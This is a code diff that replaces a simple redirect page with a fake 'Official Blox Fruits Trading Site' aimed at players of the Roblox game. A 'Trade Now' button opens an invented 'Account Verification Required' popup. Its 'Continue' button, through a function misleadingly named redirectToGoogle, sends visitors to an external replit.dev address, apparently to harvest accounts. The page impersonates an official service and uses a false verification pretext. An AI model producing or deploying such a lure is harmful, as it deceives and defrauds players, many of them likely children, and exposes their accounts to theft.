@@ -1,10 +1,159 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://643f6800-23b1-472f-8dd6-38fc7b31c575-00-1x9gketa0sk1d.spock.replit.dev/">
-    <title>Reindirizzamento</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Fruits Official Trading Site</title>
+    <meta property="og:title" content="Blox Fruits Official Trading Site">
+    <meta property="og:description" content="The official platform for trading items in Blox Fruits. Trade securely with other players.">
+    <meta property="og:image" content="https://example.com/path/to/bloxfruits-image.jpg">
+    <meta property="og:url" content="https://example.com">
+    <meta name="theme-color" content="#2c3e50">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1b1b1b;
+            color: #9b59b6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .container {
+            max-width: 800px;
+            padding: 20px;
+            background-color: #2c2c2c;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #9b59b6;
+            margin-bottom: 20px;
+        }
+        p.description {
+            font-size: 1.2rem;
+            color: #bdc3c7;
+            margin-bottom: 40px;
+        }
+        .trade-btn {
+            background-color: #9b59b6;
+            color: #fff;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .trade-btn:hover {
+            background-color: #8e44ad;
+        }
+        .image-container img {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+        }
+        /* Popup Styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background-color: #2c2c2c;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            position: relative;
+            max-width: 400px;
+            color: #fff;
+        }
+        .popup-content h2 {
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+            color: #9b59b6;
+        }
+        .popup-content p {
+            font-size: 1rem;
+            color: #bdc3c7;
+            margin-bottom: 20px;
+        }
+        .popup-content .info-icon {
+            font-size: 50px;
+            color: #f39c12;
+            margin-bottom: 20px;
+        }
+        .popup-content .close-btn, .popup-content .continue-btn {
+            background-color: #9b59b6;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin: 5px;
+            transition: background-color 0.3s ease;
+        }
+        .popup-content .close-btn:hover, .popup-content .continue-btn:hover {
+            background-color: #8e44ad;
+        }
+        .popup-content .close-btn {
+            background-color: #e74c3c;
+        }
+        .popup-content .close-btn:hover {
+            background-color: #c0392b;
+        }
+    </style>
 </head>
 <body>
+
+    <div class="container">
+        <h1>Welcome to the Official Blox Fruits Trading Site</h1>
+        <div class="image-container">
+
+        </div>
+        <p class="description">
+            This is the official platform for trading items in Blox Fruits. Connect with other players and trade your items securely.
+        </p>
+        <button class="trade-btn" onclick="openPopup()">Trade Now</button>
+    </div>
+
+    <!-- Popup -->
+    <div class="popup" id="verifyPopup">
+        <div class="popup-content">
+            <div class="info-icon">ℹ️</div>
+            <h2>Account Verification Required</h2>
+            <p>To proceed with the trade, you need to verify your account. Click "Continue" to complete the verification process.</p>
+            <button class="close-btn" onclick="closePopup()">Cancel</button>
+            <button class="continue-btn" onclick="redirectToGoogle()">Continue</button>
+        </div>
+    </div>
+
+    <script>
+        function openPopup() {
+            document.getElementById('verifyPopup').style.display = 'flex';
+        }
+
+        function closePopup() {
+            document.getElementById('verifyPopup').style.display = 'none';
+        }
+
+        function redirectToGoogle() {
+            window.location.href = 'https://643f6800-23b1-472f-8dd6-38fc7b31c575-00-1x9gketa0sk1d.spock.replit.dev/';
+        }
+    </script>
+
 </body>
 </html>
